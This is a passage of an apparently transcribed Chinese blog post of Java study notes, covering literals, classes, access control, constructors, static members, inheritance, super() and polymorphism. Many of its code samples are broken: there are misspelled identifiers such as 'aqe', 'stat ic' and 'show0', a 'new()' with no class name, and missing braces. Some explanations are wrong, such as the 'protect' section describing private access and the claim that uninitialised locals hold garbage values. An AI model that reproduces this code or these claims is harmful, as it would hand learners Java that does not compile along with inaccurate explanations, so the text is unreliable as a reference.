class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">float x &#x3D; 2.2; &#x2F;&#x2F;error</span><br><span class="line">float x &#x3D; 2.2f; &#x2F;&#x2F;OK</span><br></pre></td></tr></table></figure><h4 id="3-字符常量"><a href="#3-字符常量" class="headerlink" title="3.字符常量"></a>3.字符常量</h4><p>​    必须用单引号括起来</p><p>​    Java中字符和字符串都用Unicode编码表示</p><p>​    在Uniede编码中一个字符占两个字节  \u表示unicode编码</p><p>​        ‘a’ ‘B’ ‘\n’ ‘\u0030’</p><h4 id="4-布尔类型"><a href="#4-布尔类型" class="headerlink" title="4.布尔类型"></a>4.布尔类型</h4><p>​    用boolean表示，不能写成bool<br>​    布尔型数据<strong>只有两个值true和false</strong>，且它们不对应于任何整数值</p><p>​    布尔型变量的定义如:</p><p>​        boolean b = trye;</p><p><strong>注意：</strong></p><p>​    <strong>lf  while  for  中进行真假判断时只能使用逻辑表达式</strong></p><pre><code>## 数据类型的转换</code></pre><ul><li><p>不能对boolean类型进行类型转换。</p></li><li><p>在把容量大的类型转换为容量小的类型时必须使用强制类型转换。</p></li><li><p>整型、实型、字符型数据可以混合运算。运算中，不同类型的数据先转化为同一类型，然后进行运算，转换从低级到高级:</p><p>低 ———————————&gt; 高</p><p>byte -&gt; char -&gt; int-&gt; long -&gt; float -&gt; double</p></li></ul><h2 id="算术运输符"><a href="#算术运输符" class="headerlink" title="算术运输符"></a>算术运输符</h2><ul><li>+可以表示数值的相加</li><li>+可以表示字符串的联接<pre><code>如:“123”+&quot;“abc”的结果是“123abc”</code></pre></li><li>+还能把非字符串转换成字符串<pre><code>如:“&quot;+123;的结果是“x123”</code></pre></li><li>分析 System.out.println(‘a’+1)与System.out.println(“”+’a’+1)的区别</li></ul><h1 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h1><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><ul><li><strong>把一类事物的静态属性和动态可以执行的操作组合在一起</strong>所得的这个概念就是类</li><li>类是抽象的，用来模拟一类事物，是一个概念</li><li>一旦被定义，类的概念就永远存在了</li></ul><h4 id="类的定义"><a href="#类的定义" class="headerlink" title="类的定义"></a>类的定义</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> aqe;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shout</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;oh,my god!I am&quot;</span> + age);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    age是类的属性,也叫类数据成员，也叫字段,也叫域。</p><p>​    shout是方法,也叫类的成员函数<br>​    shout方法可以直接访问同一个类中的age变量。</p><h2 id="内存分配问题"><a href="#内存分配问题" class="headerlink" title="内存分配问题"></a>内存分配问题</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestHemo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> stat ic <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">aa </span>= <span class="keyword">new</span> A(); <span class="comment">//(A*)malloc(sizeof(A));</span></span><br><span class="line"><span class="comment">//new A(); 在堆中动态分配一块区域，被当做了A对象</span></span><br><span class="line"><span class="comment">//aa本身的内存是在栈中分配的</span></span><br><span class="line"><span class="comment">//堆中内存的地址付给了aa</span></span><br><span class="line"><span class="comment">//aa指向堆中的内存,aa代表了堆中的内存</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="访问控制符"><a href="#访问控制符" class="headerlink" title="访问控制符"></a>访问控制符</h1><p>​    在一个类的内部，所有的成员可以相互访问,访问控制符是透明的；<strong>访问控制符是针对外部访问</strong>而言的</p><p><strong>外部访问包括两种方式</strong></p><ul><li>通过类名访问类内部的成员</li><li>通过类对象名访问类内部成员</li></ul><h2 id="public-公有"><a href="#public-公有" class="headerlink" title="public 公有"></a>public 公有</h2><p>​    可以通过外部访问方式访问类内部的public成员</p><h2 id="protect-保护"><a href="#protect-保护" class="headerlink" title="protect 保护"></a>protect 保护</h2><p>​    <strong>不可以</strong>通过外部访问方式访问类内部的priavate成员</p><h2 id="默认【即不加任何修饰符】"><a href="#默认【即不加任何修饰符】" class="headerlink" title="默认【即不加任何修饰符】"></a>默认【即不加任何修饰符】</h2><h2 id="private-私有"><a href="#private-私有" class="headerlink" title="private 私有"></a>private 私有</h2><p>​    一个类的外部：通过 <strong>类对象名.私有成员名</strong> 的方式是无法访问该对象中的私有成员</p><h1 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h1><p><strong>定义：</strong></p><p>​    名字和类名一样<br>​    无返回值</p><p><strong>注意事项：</strong><br>    一个类对象只能调用一个构造方法<br>    一个类至少有一个构适方法<br>    如果自己定义了构造方法，编译器将不再提供默认的够方法</p><p><strong>同类名相同</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">A</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">i = a;</span><br><span class="line">j = b;</span><br><span class="line">system.out.printf(”无参构造函数被调用了! \n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="构造函数的返回值问题"><a href="#构造函数的返回值问题" class="headerlink" title="构造函数的返回值问题"></a>构造函数的返回值问题</h2><ul><li>在一个类中可以定义多个函数名与类名相同但却有返回值的函数，返回值为void或int或double都可以，这些有返回值的函数只要能满足重载特点，就可以同时存在一个类中，不过要注意:这些有返回值的函数(包括返回值为void的函数)都不是构造函数，都不会被类对象自动调用</li><li>当然也可以定义多个没有任何返回值的函数，注意连void都不可以加，这些函数才是构造函数,无返回值的函数才会被对象自动调用</li><li>如果定义了有返回值并且方法名与类名相同的方法，程序并不会报错，但容易产生歧义，所以<strong>强烈建议不要在构造方法前面加返回值（构造函数与类名相同）</strong></li></ul><h2 id="构造函数数据成员的赋值问题"><a href="#构造函数数据成员的赋值问题" class="headerlink" title="构造函数数据成员的赋值问题"></a>构造函数数据成员的赋值问题</h2><p>​    当一个对象被创建时，会对其中各种类型的成员变量自动进行初始化赋值。</p><p><strong>局部变量没有初始化就是垃圾值</strong> <strong>，局部变量编译器是不会自动进行初始化的，java要求所有的局部变量在使用之前都<code>必须的初始化</code></strong></p><p><strong>类的属性没有初始化会自动建立默认值</strong></p><table><thead><tr><th>成员变量类型</th><th>初始值</th></tr></thead><tbody><tr><td>byte</td><td>0</td></tr><tr><td>short</td><td>0</td></tr><tr><td>int</td><td>0</td></tr><tr><td>long</td><td>0L</td></tr><tr><td>float   double</td><td>0.0F  0.0D</td></tr><tr><td>char  boolean</td><td>‘\u000’(表示为空)   False</td></tr><tr><td>A1l ref erence type</td><td>Null</td></tr></tbody></table><ul><li>如果在定义的时候不初始化，则它的值是系统自动分配好的默认值!</li><li>如果在定义的同时赋初值，则是可以的， 也就是说该值是生效的.注意在C++中则不可以，在C++中一个类的数据成员不能在定义的同时初始化，它只能在构造函数中初始化</li><li>如果在定义的同时赋初值，当然生效，但如果在构造函数中又改变了定义时赋的初值，则该数据成员最终的值就是构造函数中修改之后的那个值,因为:</li><li><strong>系统会先执行定义时赋的初值，然后再执行构造函数中赋的初值</strong></li></ul><h1 id="函数的重载"><a href="#函数的重载" class="headerlink" title="函数的重载"></a>函数的重载</h1><p>​    同名的函数通过<strong>不同的形参</strong>做类似的事情，这就叫函数的重载</p><p><strong>函数重载要求</strong><br>    1.函数的形参个数<br>    2.函数的形参顺序<br>    3.函数的形参数据类型<br>■这三个至少有一个是不一样的</p><p>如果两个函数只是函数的返回值不一样，其他都一样，这构不成函数的重载，并且编译时会报错!</p><h1 id="关键字this"><a href="#关键字this" class="headerlink" title="关键字this"></a>关键字this</h1><ul><li>是一个系统隐含的指针被自动附加在非静态的成员函数参数列表中</li><li>当前时刻，哪个对象<strong>调用该函数</strong>，那么this就指向当前调用该函数的对象，系统会自动在该函数的参数列表中添加一个隐藏的this指针，并且把调用该函数的对象的地址赋给this指针，这样一来，在函数的内部通过this就可访问当前正在调用该函数的对象的成员。</li><li>静态函数内部，没有this指针</li><li>一个对象只含有属性的空间，n个对象公共一份方法的拷贝</li></ul><p>例子：TestThis1.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">int</span> i;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">A</span><span class="params">(<span class="keyword">int</span> j)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">i=j;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;i=&quot;</span>+ i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">M</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">A aa1 = <span class="keyword">new</span> A(<span class="number">5</span>);</span><br><span class="line">A aa2 = <span class="keyword">new</span> A(<span class="number">8</span>);</span><br><span class="line">aa1.show0;</span><br><span class="line">aa2.show0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    aa1和aa2 在内存中分别有各自的数据成员i；但是aa1和aa2公用show()方法，show方 法如何知道输出的i应该是哪那个对象中的i？<br>​    实际上每个非static方法中都隐含这一个this指针，指向当前正在调用该方法的对象</p><h1 id="静态static"><a href="#静态static" class="headerlink" title="静态static"></a>静态static</h1><p>​    属性i是属于类本身，或者讲：没有对象，我们仍然可以直接通过类名的方式访问该类内部的static属性</p><p>​    static只是表明了该成员具有了可以通过类名访问的潜在特征但是否可以通过类名访问，还必须满足一个条件：该成员必须是非private</p><p>​    静态方法不能访问非静态成员</p><p>​    非静态方法可以访问静态成员</p><p>创建新对象时属性是在不同空间但是类方法是公用的，静态方法没有this指针</p><p>Static可以修饰普通方法不能修饰构造方法，构造方法如果是私有private的就不能new出对象</p><ul><li>一个类的属性可以是个类对象</li></ul><p>例子：创建只有一个对象的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">int</span> i = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> A aa = <span class="keyword">new</span> A(); <span class="comment">//aa是否是A对象的属性创建对象  创建对象</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">A</span><span class="params">()</span>  <span class="comment">//私有不能new出新对象</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> A <span class="title">getA</span><span class="params">()</span> <span class="comment">//访问接口 static 一定不能省略</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> aa;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>静态成员属于类本身的，而不是属于对象，被类的所有对象所共有</p></li><li><p><strong>即便不创建对象，也可以使用类本身的静态成员</strong></p></li><li><p>静态成员分为</p><pre><code>静态数据成员静态方法成员</code></pre></li><li><p>使用静态成员的两种方法</p><pre><code>类名.静态成员名类对象名.静态成员名</code></pre></li><li><p>编写使用静态变量统计一个类产生的实例对象的个数的程序</p></li><li><p><strong>在静态方法里只能直接调用同类中其它的静态成员(包括变量和方法)，而不能直接访问类中的非静态成员</strong>。这是因为，对于非静态的方法和变量，需要先创建类的实例对象后才<br>可使用，而静态方法在使用前不用创建任何对象</p></li><li><p><strong>静态方法不能以任何方式引用this和super关键字</strong>。与上面的道理一样，因为静态方法在使用前不用创建任何实例对象，当静态方法被调用时，this所引用的对象根本就没有产生。</p></li><li><p>静态方法只能访问类的静态成员，但<strong>非静态方法却可以访问类中所有成员，包括静态成员</strong></p></li></ul><p>例子：</p><p>本程序证明了：</p><p>​    只有非private的static成员才可以通过类名的方式访问;</p><p>​    static只是表明了该成员具有了可以通过类名访问的潜在特征</p><p>​    但是否可以通过类名访问，还必须满足-个条件:该成 员必须是非private</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> i= <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">System.out.printf(<span class="string">&quot;2009年5月29日15:15:50\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestStatic_4</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//A.f(); //error</span></span><br><span class="line"><span class="comment">//A.i= 22; //error</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="继承-extends"><a href="#继承-extends" class="headerlink" title="继承  extends"></a>继承  extends</h1><ul><li><p>一个新类从已有的类那里获得其已有的属性和方法，这中现象叫类的继承</p></li><li><p>这个新类被称为子类，也叫派生类，已有的那个类叫做父类，也叫做基类</p></li><li><p>继承的好处<br>■<strong>代码得到极大的重用</strong><br>■<strong>形成一种类的层次体系结构，为多态创造条件</strong></p></li><li><p>继承的实现方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SubClass</span> <span class="keyword">extends</span> <span class="title">SuperClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">.......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="同包继承权限（重点）"><a href="#同包继承权限（重点）" class="headerlink" title="同包继承权限（重点）"></a>同包继承权限（重点）</h2><ul><li>子类的所有方法内部都可以访问父类除私有成员以外的所有成员，所谓子类的所有方法也包括子类的私有方法</li><li>通过子类对象名可以访问<br>1.父类除私有成员外的所有成员<br>2.子类本身的除私有成员外的所有成员<br>■附注:私有成员包括私有属性和私有方法</li><li>子类可以继承父类除私有成员以外的所有成员</li><li><strong>父类的私有成员不可以被子类继承，其他的成员都可以被子类继承</strong></li></ul><p><strong>1、子类内部可以访问父类非私有的成员</strong><br>        <strong>私有成员无法被子类方法访问</strong><br><strong>2、 通过子类对象名只能访问从父类继承过来的非私有成员</strong><br><strong>总结:</strong><br>    <strong>私有不能被继承</strong><br>    <strong>私有物理上已经被继承过来，只不过逻辑上程序员不能去访问它</strong><br>    <strong>因此继承必须慎重，否则会浪费内存</strong></p><h2 id="继承原则"><a href="#继承原则" class="headerlink" title="继承原则"></a>继承原则</h2><p>三种关系</p><p>​    1.一般到特殊</p><p>​    2.包含</p><p>​    3.使用</p><h2 id="不同访问修饰符"><a href="#不同访问修饰符" class="headerlink" title="不同访问修饰符"></a>不同访问修饰符</h2><table><thead><tr><th></th><th>public</th><th>protected</th><th>default</th><th>private</th></tr></thead><tbody><tr><td>同包同类</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>访问同包不同类</td><td>√</td><td>√</td><td>√</td><td></td></tr><tr><td>同包不同类继承</td><td>√</td><td>√</td><td>√</td><td></td></tr><tr><td>不同包继承</td><td>√</td><td>√</td><td></td><td></td></tr><tr><td>访问不同包无任何关系的类</td><td>√</td><td></td><td></td><td></td></tr></tbody></table><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ul><li>Java只支持单继承，不允许多重继承。</li><li>单继承就是一个类只能有一个父类</li><li>多继承就是一个类可以有多个父类</li><li>可以有多层继承，即一个类可以继承某一个类的子类，如类B<br>继承了类A，类C又可以继承类B，那么类C也间接继承了类A</li><li>子类可以继承父类所有的成员变量和成员方法，但<strong>子类永远无法继承父类的构造方法</strong>。在子类的构造方法中可使用语句**super(参数列表)**调用父类的构造方法。</li></ul><h2 id="super-子类无法继承父类构造方法"><a href="#super-子类无法继承父类构造方法" class="headerlink" title="super() 子类无法继承父类构造方法"></a>super() 子类无法继承父类构造方法</h2><h2 id="子类访问父类成员的三种方式"><a href="#子类访问父类成员的三种方式" class="headerlink" title="子类访问父类成员的三种方式"></a>子类访问父类成员的三种方式</h2><ul><li>在子类内部访问父类成员</li><li>通过子类对象名访问父类成员</li><li>通过子类的类名访问父类成员</li></ul><p>经验证，子类通过上述三种方式的任何一种，都无法访问父类私有成员，因此我们可以得出结果:<br>            私有成员无法被子类继承，物理继承但语法无法访问</p><p><strong>可以使用super()调用父类构造方法</strong></p><p>例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">int</span> i;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">A</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>. i = i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">int</span> j;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">B</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">super</span>(i);</span><br><span class="line">        <span class="keyword">this</span>. j = j;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>普通方法中不能调用父类的构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//super(i); //普通方法中不能调用父类的构造方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>构造方法只能调用一个</strong></p><p><strong>总结：</strong></p><p>1、每个子类构造方法的第一条语句都是隐含地调用super(), 如父类没有这种形式的构造函数，那么在编译的时候就会报错。<br>2、如果显示的写出super()；语句，则必须保证该语句是第一条语句，否则会出错<br>3、super() ;如果不写，则编译器会自动添加，所以此时如果父类没有无参的构造函数就会出错<br>4、既可以显示写super()；前提是父类必须有无参的构造函数<br>    也可以显示写super(实参)；前提是父类必须有帶参的构造函数<br>5、调用父类的构造函数的语句必须借助于super,不能直接写父类的类名，这与c++不同</p><p>6、一个构造函数中不能写多个super(参数列表)语句；</p><h1 id="重写父类方法"><a href="#重写父类方法" class="headerlink" title="重写父类方法"></a>重写父类方法</h1><ul><li>方法重写<pre><code>■指在子类中重所定义父类中已有的方法</code></pre></li><li><strong>重写方法必须和被重写方法具有相同的方法名称、参数列表和返回值类型</strong></li><li>子类中不允许出现与父类同名同参但不同返回值的方法,如果出现了，编译时会报错</li><li>覆盖方法时，<strong>不能</strong>使用比父类中被覆盖的方法<strong>更严格的访问校限【子类权限不能变低（保证多态任何时候可以实现）】</strong></li></ul><p>重写的意义</p><p>​    如果子类对继承自父类的方法不满意，就应该重写父类的方法</p><p><strong>注意：</strong></p><p>​    方法名和参数列表和返回子必须一样</p><p>​    访问权限不能过低</p><h1 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h1><p>同一代码做不一样的事情</p><p>多态：不同对象对同一刺激有不同反应</p><p>例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestPoly</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">A aa = <span class="keyword">new</span>(); <span class="comment">//A是父类</span></span><br><span class="line">B bb = <span class="keyword">new</span>(); <span class="comment">//B是子类</span></span><br><span class="line"></span><br><span class="line">aa.f();</span><br><span class="line">bb.f();</span><br><span class="line">aa = bb; <span class="comment">// 把bb当做aa来看待,因为子类可以当做父类看待，所以本语旬0K</span></span><br><span class="line"><span class="comment">//bb = aa; //把aa当做bb来看待,因为父类不能当做子类看待，所以本语句error</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>子类当成父类看，aa保存了这个对象的地址就代表这个对象</p><ul><li>一个父类的引用类型变量它既可以指向父类对象也可以指向子类对象，它可以根据当前时刻指向的不同，自动调用不同对象的方法，这就是多态</li></ul><h3 id="多态的优点"><a href="#多态的优点" class="headerlink" title="多态的优点"></a>多态的优点</h3><p>利用多态可以实现:<br>        同一段代码做不同事情<br>如:<br>    ■假设A派生出B，B派生出C<br>    ■试着编写一个函数实现调用整个A类族所有对象f方法<br>    ■所谓A类族就是A类及其A的子孙类所形成的一个族群</p><p>例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestPoly_1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">g</span><span class="params">(A aa)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">aa.f(); <span class="comment">//类似于C语言的: (*aa).f();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">A aa = <span class="keyword">new</span> A();</span><br><span class="line">B bb = <span class="keyword">new</span> B();</span><br><span class="line">C cc = <span class="keyword">new</span> C();</span><br><span class="line">D dd = <span class="keyword">new</span> D();</span><br><span class="line"></span><br><span class="line">g(aa);</span><br><span class="line">g(bb);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>父类不能强制转换为子类，但是先把子类赋给父类就可以强制转换</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">A aa = <span class="keyword">new</span> A();</span><br><span class="line">B bb = <span class="keyword">new</span> B();</span><br><span class="line"></span><br><span class="line">aa = bb;</span><br><span class="line"></span><br><span class="line"><span class="comment">//bb = aa; //error</span></span><br><span class="line">bb = (B)aa;</span><br><span class="line">bb.f();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多态：aa只能调用父类继承的方法，不能调用子类特有的方法</p><h3 id="多态注意事项"><a href="#多态注意事项" class="headerlink" title="多态注意事项"></a>多态注意事项</h3><ul><li><strong>子类对象可以直接赋给父类引用，但父类对象在任何情况下都不可以直接赋给子类引用</strong>，因为子类是父类的一种，但父类不是子类的一种,或者讲“子类可以当做父类看待，但父类不可以当做子类看待”,“狗可以当做动物看待，但动物不可以当做狗来看待”</li><li>通过父类引用只能访问子类对象从父类继承过来的成员</li><li>通过父类引用不能访问子类对象所特有的成员</li><li>父类引用永远不可能直接赋给子类引用<ul><li><strong>只有在父类引用本身指向的就是一个子类对象时，才可以把父类引用强制转化为子类引用</strong></li><li>其他情况下不允许把父类引用强制转化为子类引用，否则运行时会出</li></ul></li></ul><h1 id="抽象类-（不能构造事物）"><a href="#抽象类-（不能构造事物）" class="headerlink" title="抽象类 （不能构造事物）"></a>抽象类 （不能构造事物）</h1><ul><li>抽象类的由来<pre><code>利用抽象类是为了更好的对类加以分类，就如同人类不但给各种具体植物取了名字还发明了“植物”这个抽象的词对所有具体植物进行归类一样</code></pre></li><li>Java用来模拟现实世界，所以也存在抽象类</li><li>抽象类通常用来作为一个类族的最顶层的父类，用最底层的类表示现实中的具体事物，用最顶层的类表示该类族所有事物的共性</li></ul><p>例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 